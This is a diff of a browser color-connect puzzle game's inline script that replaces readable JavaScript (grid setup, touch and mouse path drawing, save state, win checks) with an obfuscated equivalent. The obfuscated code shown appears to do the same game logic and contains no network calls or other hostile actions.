@@ -382,660 +382,536 @@
     </div>
 </div>
 <script>
-    document.addEventListener('DOMContentLoaded', () => {
-        // Game configuration
-        const config = {
-            rows: 8,
-            cols: 8,
-            colors: ['#FF5252', '#4CAF50', '#2196F3', '#FFC107', '#9C27B0', '#00BCD4'],
-            currentLevel: 1,
-            maxLevel: 12,
-            moves: 0,
-            startTime: null,
-            timerInterval: null,
-            gameActive: false,
-            completedLevels: [],
-            touchMode: 'ontouchstart' in window
-        };
-
-        // DOM elements
-        const gameGrid = document.getElementById('gameGrid');
-        const movesElement = document.getElementById('moves');
-        const timerElement = document.getElementById('timer');
-        const levelElement = document.getElementById('level');
-        const resetBtn = document.getElementById('resetBtn');
-        const newGameBtn = document.getElementById('newGameBtn');
-        const hintBtn = document.getElementById('hintBtn');
-        const winMessage = document.getElementById('winMessage');
-        const finalMoves = document.getElementById('finalMoves');
-        const finalTime = document.getElementById('finalTime');
-        const nextLevelBtn = document.getElementById('nextLevelBtn');
-        const levelIndicator = document.getElementById('levelIndicator');
-        const stars = document.querySelectorAll('.star');
-
-        // Game state
-        let grid = [];
-        let activePath = null;
-        let completedPaths = [];
-        let isDragging = false;
-        let lastHoveredCell = null;
-
-        // حفظ حالة اللعبة
-        function saveGameState() {
-            const gameState = {
-                currentLevel: config.currentLevel,
-                completedLevels: config.completedLevels,
-                timestamp: Date.now()
+   
+const _0xe3fe94 = _0x43b3;
+(function (_0x4b0812, _0x239ec1) {
+    const _0x151feb = _0x43b3, _0x568ad2 = _0x4b0812();
+    while (!![]) {
+        try {
+            const _0x5d2c00 = parseInt(_0x151feb(0x1f0)) / 0x1 + parseInt(_0x151feb(0x205)) / 0x2 * (-parseInt(_0x151feb(0x1de)) / 0x3) + -parseInt(_0x151feb(0x1c0)) / 0x4 + -parseInt(_0x151feb(0x1c7)) / 0x5 * (parseInt(_0x151feb(0x1e6)) / 0x6) + parseInt(_0x151feb(0x1fa)) / 0x7 + -parseInt(_0x151feb(0x19e)) / 0x8 * (-parseInt(_0x151feb(0x1e1)) / 0x9) + -parseInt(_0x151feb(0x1b3)) / 0xa * (-parseInt(_0x151feb(0x1ad)) / 0xb);
+            if (_0x5d2c00 === _0x239ec1)
+                break;
+            else
+                _0x568ad2['push'](_0x568ad2['shift']());
+        } catch (_0x108703) {
+            _0x568ad2['push'](_0x568ad2['shift']());
+        }
+    }
+}(_0x4d59, 0xa0f5a), document[_0xe3fe94(0x195)](_0xe3fe94(0x202), () => {
+    const _0x65534 = _0xe3fe94, _0x799354 = {
+            'rows': 0x8,
+            'cols': 0x8,
+            'colors': [
+                _0x65534(0x20e),
+                _0x65534(0x1ed),
+                _0x65534(0x18d),
+                _0x65534(0x20d),
+                '#9C27B0',
+                '#00BCD4'
+            ],
+            'currentLevel': 0x1,
+            'maxLevel': 0xc,
+            'moves': 0x0,
+            'startTime': null,
+            'timerInterval': null,
+            'gameActive': ![],
+            'completedLevels': [],
+            'touchMode': _0x65534(0x1b8) in window
+        }, _0x990b64 = document[_0x65534(0x1f8)](_0x65534(0x20b)), _0x111183 = document[_0x65534(0x1f8)](_0x65534(0x18a)), _0x43ac11 = document[_0x65534(0x1f8)](_0x65534(0x1ae)), _0x594c4c = document[_0x65534(0x1f8)](_0x65534(0x1a2)), _0x351ac5 = document['getElementById'](_0x65534(0x1db)), _0x553e4e = document[_0x65534(0x1f8)](_0x65534(0x203)), _0x36d803 = document[_0x65534(0x1f8)](_0x65534(0x200)), _0x3f3584 = document[_0x65534(0x1f8)](_0x65534(0x19c)), _0x4e8122 = document[_0x65534(0x1f8)](_0x65534(0x1a4)), _0x36f541 = document[_0x65534(0x1f8)](_0x65534(0x1d2)), _0x3f79ac = document[_0x65534(0x1f8)]('nextLevelBtn'), _0x229905 = document[_0x65534(0x1f8)](_0x65534(0x1eb)), _0x5bfd7d = document['querySelectorAll'](_0x65534(0x1f6));
+    let _0x1391e8 = [], _0x5c2168 = null, _0x12b2cf = [], _0x590fb5 = ![], _0xc4971e = null;
+    function _0x36c129() {
+        const _0x4ce7d0 = _0x65534, _0x5540f8 = {
+                'currentLevel': _0x799354['currentLevel'],
+                'completedLevels': _0x799354[_0x4ce7d0(0x1f5)],
+                'timestamp': Date[_0x4ce7d0(0x1b5)]()
             };
-            localStorage.setItem('colorConnectGameState', JSON.stringify(gameState));
+        localStorage[_0x4ce7d0(0x1e3)](_0x4ce7d0(0x1d8), JSON[_0x4ce7d0(0x1c1)](_0x5540f8));
+    }
+    function _0x438e29() {
+        const _0x3da8b4 = _0x65534, _0x48f92c = localStorage['getItem'](_0x3da8b4(0x1d8));
+        if (_0x48f92c) {
+            const _0x2d3720 = JSON['parse'](_0x48f92c);
+            return _0x799354[_0x3da8b4(0x1f9)] = _0x2d3720[_0x3da8b4(0x1f9)], _0x799354['completedLevels'] = _0x2d3720[_0x3da8b4(0x1f5)] || [], !![];
         }
-
-        // استعادة حالة اللعبة
-        function loadGameState() {
-            const savedState = localStorage.getItem('colorConnectGameState');
-            if (savedState) {
-                const gameState = JSON.parse(savedState);
-                config.currentLevel = gameState.currentLevel;
-                config.completedLevels = gameState.completedLevels || [];
-                return true;
-            }
-            return false;
-        }
-
-        // Initialize the game
-        function initGame() {
-            // Reset game state
-            config.moves = 0;
-            movesElement.textContent = '0';
-            config.currentLevel = Math.min(config.currentLevel, config.maxLevel);
-            levelElement.textContent = config.currentLevel;
-
-            // Clear grid
-            gameGrid.innerHTML = '';
-            grid = [];
-            completedPaths = [];
-            activePath = null;
-            isDragging = false;
-            lastHoveredCell = null;
-
-            // Create grid cells
-            for (let row = 0; row < config.rows; row++) {
-                grid[row] = [];
-                for (let col = 0; col < config.cols; col++) {
-                    const cell = document.createElement('div');
-                    cell.className = 'cell';
-                    cell.dataset.row = row;
-                    cell.dataset.col = col;
-
-                    // Add touch and mouse events
-                    cell.addEventListener('click', () => handleCellClick(row, col));
-                    cell.addEventListener('mousedown', () => handleCellMouseDown(row, col));
-                    cell.addEventListener('mouseenter', () => handleCellMouseEnter(row, col));
-
-                    // Touch events
-                    cell.addEventListener('touchstart', (e) => {
-                        e.preventDefault();
-                        handleCellTouchStart(row, col);
-                    }, { passive: false });
-
-                    gameGrid.appendChild(cell);
-                    grid[row][col] = {
-                        element: cell,
-                        color: null,
-                        path: null,
-                        isDot: false
-                    };
-                }
-            }
-
-            // Add global touch and mouse events
-            document.addEventListener('mousemove', handleMouseMove);
-            document.addEventListener('mouseup', handleMouseUp);
-            document.addEventListener('touchmove', handleTouchMove, { passive: false });
-            document.addEventListener('touchend', handleTouchEnd);
-
-            // Place colored dots
-            placeColorDots();
-
-            // Update level indicator
-            updateLevelIndicator();
-
-            // Reset timer
-            stopTimer();
-            timerElement.textContent = '00:00';
-            config.startTime = Date.now();
-            startTimer();
-            config.gameActive = true;
-        }
-
-        // Touch start handler
-        function handleCellTouchStart(row, col) {
-            handleCellClick(row, col);
-            isDragging = true;
-            lastHoveredCell = { row, col };
-        }
-
-        // Touch move handler
-        function handleTouchMove(e) {
-            if (!isDragging || !config.gameActive) return;
-            e.preventDefault();
-
-            const touch = e.touches[0];
-            const element = document.elementFromPoint(touch.clientX, touch.clientY);
-
-            if (element && element.classList.contains('cell')) {
-                const row = parseInt(element.dataset.row);
-                const col = parseInt(element.dataset.col);
-
-                // Prevent processing same cell multiple times
-                if (lastHoveredCell && lastHoveredCell.row === row && lastHoveredCell.col === col) {
-                    return;
-                }
-
-                lastHoveredCell = { row, col };
-                handleCellHover(row, col);
-            }
-        }
-
-        // Touch end handler
-        function handleTouchEnd() {
-            isDragging = false;
-            lastHoveredCell = null;
-        }
-
-        // Mouse down handler
-        function handleCellMouseDown(row, col) {
-            isDragging = true;
-            handleCellClick(row, col);
-            lastHoveredCell = { row, col };
-        }
-
-        // Mouse move handler
-        function handleMouseMove(e) {
-            if (!isDragging || !config.gameActive) return;
-
-            const element = document.elementFromPoint(e.clientX, e.clientY);
-
-            if (element && element.classList.contains('cell')) {
-                const row = parseInt(element.dataset.row);
-                const col = parseInt(element.dataset.col);
-
-                // Prevent processing same cell multiple times
-                if (lastHoveredCell && lastHoveredCell.row === row && lastHoveredCell.col === col) {
-                    return;
-                }
-
-                lastHoveredCell = { row, col };
-                handleCellHover(row, col);
-            }
-        }
-
-        // Mouse up handler
-        function handleMouseUp() {
-            isDragging = false;
-            lastHoveredCell = null;
-        }
-
-        // Mouse enter handler
-        function handleCellMouseEnter(row, col) {
-            if (isDragging && config.gameActive) {
-                handleCellHover(row, col);
-            }
-        }
-
-        // Place colored dots on the grid
-        function placeColorDots() {
-            // Calculate number of colors based on level (easier progression)
-            const colorCount = Math.min(2 + Math.floor(config.currentLevel / 2), config.colors.length);
-            const colors = config.colors.slice(0, colorCount);
-
-            for (const color of colors) {
-                // Place two dots of the same color
-                for (let i = 0; i < 2; i++) {
-                    let placed = false;
-                    let attempts = 0;
-
-                    while (!placed && attempts < 100) {
-                        const row = Math.floor(Math.random() * config.rows);
-                        const col = Math.floor(Math.random() * config.cols);
-
-                        if (!grid[row][col].isDot) {
-                            grid[row][col].isDot = true;
-                            grid[row][col].color = color;
-
-                            const dot = document.createElement('div');
-                            dot.className = 'dot';
-                            dot.style.backgroundColor = color;
-
-                            grid[row][col].element.appendChild(dot);
-                            placed = true;
-                        }
-
-                        attempts++;
-                    }
-                }
-            }
-        }
-
-        // Handle cell click
-        function handleCellClick(row, col) {
-            if (!config.gameActive) return;
-
-            const cell = grid[row][col];
-
-            // Start a new path if clicking on a dot
-            if (cell.isDot && !cell.path) {
-                // Check if this color is already completed
-                if (completedPaths.some(path => path.color === cell.color)) return;
-
-                // Start new path
-                activePath = {
-                    color: cell.color,
-                    start: { row, col },
-                    end: null,
-                    path: [{ row, col }]
+        return ![];
+    }
+    function _0x50c248() {
+        const _0x6ccbd1 = _0x65534;
+        _0x799354[_0x6ccbd1(0x18a)] = 0x0, _0x111183[_0x6ccbd1(0x19b)] = '0', _0x799354[_0x6ccbd1(0x1f9)] = Math[_0x6ccbd1(0x1f1)](_0x799354['currentLevel'], _0x799354['maxLevel']), _0x594c4c[_0x6ccbd1(0x19b)] = _0x799354[_0x6ccbd1(0x1f9)], _0x990b64[_0x6ccbd1(0x18f)] = '', _0x1391e8 = [], _0x12b2cf = [], _0x5c2168 = null, _0x590fb5 = ![], _0xc4971e = null;
+        for (let _0x2484a3 = 0x0; _0x2484a3 < _0x799354[_0x6ccbd1(0x1bc)]; _0x2484a3++) {
+            _0x1391e8[_0x2484a3] = [];
+            for (let _0x13e17f = 0x0; _0x13e17f < _0x799354[_0x6ccbd1(0x1dd)]; _0x13e17f++) {
+                const _0x5feb85 = document['createElement']('div');
+                _0x5feb85[_0x6ccbd1(0x197)] = 'cell', _0x5feb85[_0x6ccbd1(0x1b4)][_0x6ccbd1(0x1e5)] = _0x2484a3, _0x5feb85[_0x6ccbd1(0x1b4)]['col'] = _0x13e17f, _0x5feb85['addEventListener']('click', () => _0x49dd1e(_0x2484a3, _0x13e17f)), _0x5feb85[_0x6ccbd1(0x195)](_0x6ccbd1(0x18c), () => _0x599469(_0x2484a3, _0x13e17f)), _0x5feb85[_0x6ccbd1(0x195)](_0x6ccbd1(0x1e8), () => _0x4039e8(_0x2484a3, _0x13e17f)), _0x5feb85[_0x6ccbd1(0x195)](_0x6ccbd1(0x1f7), _0x12012e => {
+                    _0x12012e['preventDefault'](), _0x508ade(_0x2484a3, _0x13e17f);
+                }, { 'passive': ![] }), _0x990b64[_0x6ccbd1(0x1a9)](_0x5feb85), _0x1391e8[_0x2484a3][_0x13e17f] = {
+                    'element': _0x5feb85,
+                    'color': null,
+                    'path': null,
+                    'isDot': ![]
                 };
-
-                cell.path = activePath;
-                updatePathDisplay();
-
-                config.moves++;
-                movesElement.textContent = config.moves;
             }
         }
-
-        // Handle cell hover (for path drawing)
-        function handleCellHover(row, col) {
-            if (!activePath || !config.gameActive) return;
-
-            const lastCell = activePath.path[activePath.path.length - 1];
-
-            // Check if the cell is adjacent to the last cell in the path
-            if (Math.abs(row - lastCell.row) + Math.abs(col - lastCell.col) !== 1) {
+        document['addEventListener'](_0x6ccbd1(0x1d4), _0x24069b), document[_0x6ccbd1(0x195)](_0x6ccbd1(0x192), _0x38528e), document['addEventListener'](_0x6ccbd1(0x1ff), _0x1788fe, { 'passive': ![] }), document['addEventListener']('touchend', _0x511680), _0x18107b(), _0x668222(), _0x340b6c(), _0x43ac11[_0x6ccbd1(0x19b)] = _0x6ccbd1(0x1e2), _0x799354[_0x6ccbd1(0x193)] = Date[_0x6ccbd1(0x1b5)](), _0x208f2a(), _0x799354['gameActive'] = !![];
+    }
+    function _0x508ade(_0xc0fde9, _0x49cf12) {
+        _0x49dd1e(_0xc0fde9, _0x49cf12), _0x590fb5 = !![], _0xc4971e = {
+            'row': _0xc0fde9,
+            'col': _0x49cf12
+        };
+    }
+    function _0x1788fe(_0xc7568c) {
+        const _0x8837ab = _0x65534;
+        if (!_0x590fb5 || !_0x799354[_0x8837ab(0x1d0)])
+            return;
+        _0xc7568c[_0x8837ab(0x1dc)]();
+        const _0x28201f = _0xc7568c[_0x8837ab(0x1be)][0x0], _0x2b6780 = document[_0x8837ab(0x1fe)](_0x28201f[_0x8837ab(0x1e0)], _0x28201f['clientY']);
+        if (_0x2b6780 && _0x2b6780[_0x8837ab(0x20c)][_0x8837ab(0x1fc)](_0x8837ab(0x190))) {
+            const _0x9778a0 = parseInt(_0x2b6780[_0x8837ab(0x1b4)]['row']), _0x3ec4fd = parseInt(_0x2b6780[_0x8837ab(0x1b4)][_0x8837ab(0x1ce)]);
+            if (_0xc4971e && _0xc4971e[_0x8837ab(0x1e5)] === _0x9778a0 && _0xc4971e[_0x8837ab(0x1ce)] === _0x3ec4fd)
                 return;
-            }
-
-            const cell = grid[row][col];
-
-            // Check if the cell is already part of the path (for backtracking)
-            const pathIndex = activePath.path.findIndex(p => p.row === row && p.col === col);
-
-            if (pathIndex >= 0) {
-                // Backtracking: remove all cells after this one in the path
-                activePath.path = activePath.path.slice(0, pathIndex + 1);
-            } else {
-                // Check if the cell is empty or the matching dot
-                if (cell.path || (cell.isDot && cell.color !== activePath.color)) {
-                    return;
-                }
-
-                // Add cell to path
-                activePath.path.push({ row, col });
-
-                // Check if we reached the matching dot
-                if (cell.isDot && cell.color === activePath.color) {
-                    // Complete the path
-                    activePath.end = { row, col };
-                    completedPaths.push(activePath);
-
-                    // Update display to set path for the end dot
-                    updatePathDisplay();
-
-                    // Set activePath to null after updating display
-                    activePath = null;
-
-                    // Check for win after updating display
-                    if (checkWin()) {
-                        showWinMessage();
+            _0xc4971e = {
+                'row': _0x9778a0,
+                'col': _0x3ec4fd
+            }, _0x68ee43(_0x9778a0, _0x3ec4fd);
+        }
+    }
+    function _0x511680() {
+        _0x590fb5 = ![], _0xc4971e = null;
+    }
+    function _0x599469(_0x217668, _0x2a88d7) {
+        _0x590fb5 = !![], _0x49dd1e(_0x217668, _0x2a88d7), _0xc4971e = {
+            'row': _0x217668,
+            'col': _0x2a88d7
+        };
+    }
+    function _0x24069b(_0x4ceea3) {
+        const _0x3648eb = _0x65534;
+        if (!_0x590fb5 || !_0x799354[_0x3648eb(0x1d0)])
+            return;
+        const _0x17c190 = document[_0x3648eb(0x1fe)](_0x4ceea3[_0x3648eb(0x1e0)], _0x4ceea3[_0x3648eb(0x1a0)]);
+        if (_0x17c190 && _0x17c190[_0x3648eb(0x20c)][_0x3648eb(0x1fc)](_0x3648eb(0x190))) {
+            const _0x3318b5 = parseInt(_0x17c190[_0x3648eb(0x1b4)][_0x3648eb(0x1e5)]), _0x384614 = parseInt(_0x17c190[_0x3648eb(0x1b4)]['col']);
+            if (_0xc4971e && _0xc4971e[_0x3648eb(0x1e5)] === _0x3318b5 && _0xc4971e['col'] === _0x384614)
+                return;
+            _0xc4971e = {
+                'row': _0x3318b5,
+                'col': _0x384614
+            }, _0x68ee43(_0x3318b5, _0x384614);
+        }
+    }
+    function _0x38528e() {
+        _0x590fb5 = ![], _0xc4971e = null;
+    }
+    function _0x4039e8(_0x2c5d62, _0x2a12a8) {
+        _0x590fb5 && _0x799354['gameActive'] && _0x68ee43(_0x2c5d62, _0x2a12a8);
+    }
+    function _0x18107b() {
+        const _0x3e078a = _0x65534, _0x4a28ee = Math['min'](0x2 + Math[_0x3e078a(0x1aa)](_0x799354['currentLevel'] / 0x2), _0x799354[_0x3e078a(0x1af)][_0x3e078a(0x196)]), _0x123e79 = _0x799354['colors'][_0x3e078a(0x1d5)](0x0, _0x4a28ee);
+        for (const _0x392cf6 of _0x123e79) {
+            for (let _0x5edda3 = 0x0; _0x5edda3 < 0x2; _0x5edda3++) {
+                let _0x44730f = ![], _0x46cb5e = 0x0;
+                while (!_0x44730f && _0x46cb5e < 0x64) {
+                    const _0x534afc = Math['floor'](Math[_0x3e078a(0x1b2)]() * _0x799354[_0x3e078a(0x1bc)]), _0x5e2bc7 = Math['floor'](Math[_0x3e078a(0x1b2)]() * _0x799354[_0x3e078a(0x1dd)]);
+                    if (!_0x1391e8[_0x534afc][_0x5e2bc7][_0x3e078a(0x1e4)]) {
+                        _0x1391e8[_0x534afc][_0x5e2bc7][_0x3e078a(0x1e4)] = !![], _0x1391e8[_0x534afc][_0x5e2bc7][_0x3e078a(0x1ac)] = _0x392cf6;
+                        const _0x1b1f64 = document[_0x3e078a(0x1d9)]('div');
+                        _0x1b1f64[_0x3e078a(0x197)] = _0x3e078a(0x1a3), _0x1b1f64[_0x3e078a(0x199)][_0x3e078a(0x1a8)] = _0x392cf6, _0x1391e8[_0x534afc][_0x5e2bc7]['element'][_0x3e078a(0x1a9)](_0x1b1f64), _0x44730f = !![];
                     }
+                    _0x46cb5e++;
                 }
             }
-
-            // Update display only if there's an active path
-            if (activePath !== null) {
-                updatePathDisplay();
-            }
-
-            // Update moves only when adding to path (not backtracking)
-            if (pathIndex === -1) {
-                config.moves++;
-                movesElement.textContent = config.moves;
+        }
+    }
+    function _0x49dd1e(_0x2a2322, _0x2e0d7c) {
+        const _0xa7146b = _0x65534;
+        if (!_0x799354[_0xa7146b(0x1d0)])
+            return;
+        const _0x2bbadf = _0x1391e8[_0x2a2322][_0x2e0d7c];
+        if (_0x2bbadf[_0xa7146b(0x1e4)] && !_0x2bbadf[_0xa7146b(0x20a)]) {
+            if (_0x12b2cf[_0xa7146b(0x1df)](_0x1e8adc => _0x1e8adc['color'] === _0x2bbadf[_0xa7146b(0x1ac)]))
+                return;
+            _0x5c2168 = {
+                'color': _0x2bbadf['color'],
+                'start': {
+                    'row': _0x2a2322,
+                    'col': _0x2e0d7c
+                },
+                'end': null,
+                'path': [{
+                        'row': _0x2a2322,
+                        'col': _0x2e0d7c
+                    }]
+            }, _0x2bbadf[_0xa7146b(0x20a)] = _0x5c2168, _0x42af9e(), _0x799354['moves']++, _0x111183[_0xa7146b(0x19b)] = _0x799354['moves'];
+        }
+    }
+    function _0x68ee43(_0x345d15, _0x1ee813) {
+        const _0x4ed293 = _0x65534;
+        if (!_0x5c2168 || !_0x799354[_0x4ed293(0x1d0)])
+            return;
+        const _0x4568e8 = _0x5c2168[_0x4ed293(0x20a)][_0x5c2168[_0x4ed293(0x20a)][_0x4ed293(0x196)] - 0x1];
+        if (Math[_0x4ed293(0x19d)](_0x345d15 - _0x4568e8[_0x4ed293(0x1e5)]) + Math[_0x4ed293(0x19d)](_0x1ee813 - _0x4568e8[_0x4ed293(0x1ce)]) !== 0x1)
+            return;
+        const _0x2bfab3 = _0x1391e8[_0x345d15][_0x1ee813], _0x2d5ea8 = _0x5c2168[_0x4ed293(0x20a)][_0x4ed293(0x1a5)](_0x2fe760 => _0x2fe760['row'] === _0x345d15 && _0x2fe760[_0x4ed293(0x1ce)] === _0x1ee813);
+        if (_0x2d5ea8 >= 0x0)
+            _0x5c2168[_0x4ed293(0x20a)] = _0x5c2168[_0x4ed293(0x20a)][_0x4ed293(0x1d5)](0x0, _0x2d5ea8 + 0x1);
+        else {
+            if (_0x2bfab3[_0x4ed293(0x20a)] || _0x2bfab3[_0x4ed293(0x1e4)] && _0x2bfab3[_0x4ed293(0x1ac)] !== _0x5c2168[_0x4ed293(0x1ac)])
+                return;
+            _0x5c2168[_0x4ed293(0x20a)]['push']({
+                'row': _0x345d15,
+                'col': _0x1ee813
+            }), _0x2bfab3[_0x4ed293(0x1e4)] && _0x2bfab3[_0x4ed293(0x1ac)] === _0x5c2168['color'] && (_0x5c2168[_0x4ed293(0x19a)] = {
+                'row': _0x345d15,
+                'col': _0x1ee813
+            }, _0x12b2cf[_0x4ed293(0x208)](_0x5c2168), _0x42af9e(), _0x5c2168 = null, _0x21d39f() && _0x553d8f());
+        }
+        _0x5c2168 !== null && _0x42af9e(), _0x2d5ea8 === -0x1 && (_0x799354[_0x4ed293(0x18a)]++, _0x111183[_0x4ed293(0x19b)] = _0x799354[_0x4ed293(0x18a)]);
+    }
+    function _0x42af9e() {
+        const _0x939239 = _0x65534;
+        for (let _0x35009a = 0x0; _0x35009a < _0x799354[_0x939239(0x1bc)]; _0x35009a++) {
+            for (let _0x36fca4 = 0x0; _0x36fca4 < _0x799354[_0x939239(0x1dd)]; _0x36fca4++) {
+                _0x1391e8[_0x35009a][_0x36fca4]['path'] = null;
+                const _0x261754 = _0x1391e8[_0x35009a][_0x36fca4][_0x939239(0x1b1)][_0x939239(0x1fd)](_0x939239(0x1bf));
+                _0x261754 && _0x1391e8[_0x35009a][_0x36fca4]['element'][_0x939239(0x1e7)](_0x261754);
             }
         }
-
-        // Update the visual display of paths
-        function updatePathDisplay() {
-            // Clear all paths
-            for (let row = 0; row < config.rows; row++) {
-                for (let col = 0; col < config.cols; col++) {
-                    grid[row][col].path = null;
-                    const pathElement = grid[row][col].element.querySelector('.path');
-                    if (pathElement) {
-                        grid[row][col].element.removeChild(pathElement);
-                    }
-                }
-            }
-
-            // Draw completed paths
-            completedPaths.forEach(path => {
-                drawPath(path);
-            });
-
-            // Draw active path
-            if (activePath) {
-                drawPath(activePath);
+        _0x12b2cf[_0x939239(0x1c4)](_0x35c6a1 => {
+            _0x8b698c(_0x35c6a1);
+        }), _0x5c2168 && _0x8b698c(_0x5c2168);
+    }
+    function _0x8b698c(_0x40c084) {
+        const _0x304663 = _0x65534;
+        for (let _0x224207 = 0x0; _0x224207 < _0x40c084[_0x304663(0x20a)][_0x304663(0x196)]; _0x224207++) {
+            const {
+                row: _0x3ffec1,
+                col: _0x540244
+            } = _0x40c084[_0x304663(0x20a)][_0x224207];
+            _0x1391e8[_0x3ffec1][_0x540244]['path'] = _0x40c084;
+            if (_0x1391e8[_0x3ffec1][_0x540244]['isDot'] && (_0x224207 === 0x0 || _0x224207 === _0x40c084['path']['length'] - 0x1))
+                continue;
+            const _0x2c9b4b = document[_0x304663(0x1d9)](_0x304663(0x1c9));
+            _0x2c9b4b[_0x304663(0x197)] = _0x304663(0x20a), _0x2c9b4b[_0x304663(0x199)][_0x304663(0x1a8)] = _0x40c084[_0x304663(0x1ac)];
+            const _0x310f4b = _0x224207 > 0x0 ? _0x40c084[_0x304663(0x20a)][_0x224207 - 0x1] : null, _0x44aaee = _0x224207 < _0x40c084['path'][_0x304663(0x196)] - 0x1 ? _0x40c084['path'][_0x224207 + 0x1] : null;
+            if (_0x310f4b && _0x44aaee) {
+                if (_0x310f4b[_0x304663(0x1e5)] === _0x44aaee['row'])
+                    _0x2c9b4b[_0x304663(0x199)]['width'] = _0x304663(0x207), _0x2c9b4b[_0x304663(0x199)]['height'] = _0x304663(0x1b7);
+                else
+                    _0x310f4b[_0x304663(0x1ce)] === _0x44aaee[_0x304663(0x1ce)] ? (_0x2c9b4b[_0x304663(0x199)][_0x304663(0x18b)] = _0x304663(0x1b7), _0x2c9b4b[_0x304663(0x199)][_0x304663(0x1fb)] = '100%') : (_0x2c9b4b['style'][_0x304663(0x18b)] = _0x304663(0x1e9), _0x2c9b4b[_0x304663(0x199)][_0x304663(0x1fb)] = _0x304663(0x1e9), _0x2c9b4b['style'][_0x304663(0x1c5)] = _0x304663(0x1b9));
+            } else
+                _0x2c9b4b[_0x304663(0x199)]['width'] = '60%', _0x2c9b4b[_0x304663(0x199)]['height'] = '60%', _0x2c9b4b[_0x304663(0x199)]['borderRadius'] = _0x304663(0x1b9);
+            _0x1391e8[_0x3ffec1][_0x540244][_0x304663(0x1b1)][_0x304663(0x1a9)](_0x2c9b4b);
+        }
+    }
+    function _0x21d39f() {
+        const _0x31cfed = _0x65534;
+        for (let _0x573631 = 0x0; _0x573631 < _0x799354[_0x31cfed(0x1bc)]; _0x573631++) {
+            for (let _0x56c94c = 0x0; _0x56c94c < _0x799354[_0x31cfed(0x1dd)]; _0x56c94c++) {
+                const _0x2d968e = _0x1391e8[_0x573631][_0x56c94c];
+                if (_0x2d968e[_0x31cfed(0x1e4)] && !_0x2d968e[_0x31cfed(0x20a)])
+                    return ![];
             }
         }
-
-        // Draw a path on the grid
-        function drawPath(path) {
-            for (let i = 0; i < path.path.length; i++) {
-                const { row, col } = path.path[i];
-                grid[row][col].path = path;
-
-                // Skip dots (they are already displayed)
-                if (grid[row][col].isDot && (i === 0 || i === path.path.length - 1)) {
-                    continue;
-                }
-
-                // Create path segment
-                const pathElement = document.createElement('div');
-                pathElement.className = 'path';
-                pathElement.style.backgroundColor = path.color;
-
-                // Add connection indicators
-                const prev = i > 0 ? path.path[i - 1] : null;
-                const next = i < path.path.length - 1 ? path.path[i + 1] : null;
-
-                if (prev && next) {
-                    // Horizontal or vertical connection
-                    if (prev.row === next.row) {
-                        pathElement.style.width = '100%';
-                        pathElement.style.height = '40%';
-                    } else if (prev.col === next.col) {
-                        pathElement.style.width = '40%';
-                        pathElement.style.height = '100%';
-                    }
-                    // Corner connection
-                    else {
-                        pathElement.style.width = '70%';
-                        pathElement.style.height = '70%';
-                        pathElement.style.borderRadius = '50%';
-                    }
-                }
-                // End of path
-                else {
-                    pathElement.style.width = '60%';
-                    pathElement.style.height = '60%';
-                    pathElement.style.borderRadius = '50%';
-                }
-
-                grid[row][col].element.appendChild(pathElement);
-            }
+        for (const _0x1247bc of _0x12b2cf) {
+            if (!_0x1247bc[_0x31cfed(0x204)] || !_0x1247bc[_0x31cfed(0x19a)])
+                return ![];
         }
-
-        // Check if the player has won
-        function checkWin() {
-            // Check if all dots have paths
-            for (let row = 0; row < config.rows; row++) {
-                for (let col = 0; col < config.cols; col++) {
-                    const cell = grid[row][col];
-                    if (cell.isDot && !cell.path) {
-                        return false;
-                    }
-                }
-            }
-
-            // Check if all paths are completed (have start and end)
-            for (const path of completedPaths) {
-                if (!path.start || !path.end) {
-                    return false;
-                }
-            }
-
-            return true;
-        }
-
-        // Timer functions
-        function startTimer() {
-            config.startTime = Date.now();
-            config.timerInterval = setInterval(() => {
-                const elapsed = Math.floor((Date.now() - config.startTime) / 1000);
-                const minutes = Math.floor(elapsed / 60).toString().padStart(2, '0');
-                const seconds = (elapsed % 60).toString().padStart(2, '0');
-                timerElement.textContent = `${minutes}:${seconds}`;
-            }, 1000);
-        }
-
-        function stopTimer() {
-            if (config.timerInterval) {
-                clearInterval(config.timerInterval);
-                config.timerInterval = null;
-            }
-        }
-
-        // Calculate stars based on performance
-        function calculateStars() {
-            const elapsed = Math.floor((Date.now() - config.startTime) / 1000);
-            const colorCount = Math.min(2 + Math.floor(config.currentLevel / 2), config.colors.length);
-            const optimalMoves = colorCount * 10; // Base optimal moves
-
-            // Calculate stars based on moves and time
-            let stars = 3;
-
-            // Deduct stars for too many moves
-            if (config.moves > optimalMoves * 1.5) {
-                stars = 1;
-            } else if (config.moves > optimalMoves * 1.2) {
-                stars = 2;
-            }
-
-            // Deduct stars for taking too long
-            if (elapsed > optimalMoves * 5) {
-                stars = Math.max(1, stars - 1);
-            }
-
-            return stars;
-        }
-
-        // Create fireworks
-        function createFireworks() {
-            for (let i = 0; i < 50; i++) {
-                setTimeout(() => {
-                    const firework = document.createElement('div');
-                    firework.className = 'firework';
-
-                    // Random position
-                    const x = Math.random() * 100;
-                    const y = Math.random() * 100;
-
-                    // Random color
-                    const colors = ['#FF5252', '#4CAF50', '#2196F3', '#FFC107', '#9C27B0', '#00BCD4', '#FF9800', '#E91E63'];
-                    const color = colors[Math.floor(Math.random() * colors.length)];
-
-                    firework.style.left = `${x}%`;
-                    firework.style.top = `${y}%`;
-                    firework.style.backgroundColor = color;
-
-                    // Random direction
-                    const angle = Math.random() * Math.PI * 2;
-                    const distance = 50 + Math.random() * 100;
-                    const tx = Math.cos(angle) * distance;
-                    const ty = Math.sin(angle) * distance;
-
-                    firework.style.setProperty('--tx', `${tx}px`);
-                    firework.style.setProperty('--ty', `${ty}px`);
-
-                    winMessage.appendChild(firework);
-
-                    // Remove after animation
-                    setTimeout(() => {
-                        firework.remove();
-                    }, 1000);
-                }, i * 50);
-            }
-        }
-
-        // Show win message
-        function showWinMessage() {
-            stopTimer();
-            config.gameActive = false;
-
-            // Mark level as completed
-            if (!config.completedLevels.includes(config.currentLevel)) {
-                config.completedLevels.push(config.currentLevel);
-                // حفظ حالة اللعبة عند إكمال مستوى
-                saveGameState();
-            }
-
-            finalMoves.textContent = config.moves;
-            finalTime.textContent = timerElement.textContent;
-
-            // Calculate stars
-            const starCount = calculateStars();
-
-            // Show win message with animation
-            winMessage.classList.add('show');
-
-            // Create fewer celebration elements without hearts
-            for (let i = 0; i < 8; i++) {
-                const celebration = document.createElement('div');
-                celebration.className = 'celebration';
-                celebration.style.left = `${Math.random() * 100}%`;
-                celebration.style.top = `${Math.random() * 100}%`;
-                celebration.style.animationDelay = `${Math.random() * 2}s`;
-
-                // Celebration icons without hearts
-                const icons = ['fa-star', 'fa-certificate', 'fa-fire', 'fa-gem', 'fa-trophy'];
